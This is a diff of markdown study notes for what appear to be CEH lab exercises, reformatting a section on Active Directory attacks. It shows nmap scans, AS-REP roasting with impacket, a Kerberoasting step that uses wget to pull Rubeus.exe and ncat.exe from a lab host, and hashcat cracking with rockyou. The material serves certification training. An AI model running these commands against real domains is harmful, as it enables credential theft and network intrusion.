@@ -296,9 +296,16 @@ exploit
 ## Perform Active Directory (AD) Attacks Using Various Tools
 ```
 nmap 10.10.1.0/24
-nmap -A -sC -sV 10.10.1.22
+     port 88/TCP kerberos-sec and port 389/TCP LDAP
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
 
-AS-REP Roasting Attack
+nmap -A -sC -sV 10.10.1.22
+```
+## AS-REP Roasting Attack
+```
 cd impacket/examples
 python3 GetNPUsers.py CEH.com/ -no-pass -usersfile /root/ADtools/users.txt -dc-ip 10.10.1.22.
 copy joshuahash.txt
@@ -360,6 +367,7 @@ whoami
 ```
 ##  Perform Kerberoasting Attack
 
+```
 cd ../.. ; cd Users\Public\Downloads.
 wget http://10.10.1.13:8000/Rubeus.exe -o rubeus.exe ; wget http://10.10.1.13:8000/ncat.exe -o ncat.exe
 cd ../.. && cd Users\Public\Downloads 
@@ -371,9 +379,10 @@ hashcat -m 13100 --force -a 0 hash.txt /root/ADtools/rockyou.txt.
 ```
 
 ## Módulo 07 – Malware Threats
+```
 Los labs de este módulo son mayormente basados en GUI (crear/analizar malware con herramientas visuales, sandboxing). No se identificaron comandos CLI adicionales fuera de los ya cubiertos en Módulo 06 (msfvenom, listeners netcat).
 
----
+```
 
 ## Módulo 08 – Sniffing
 ```
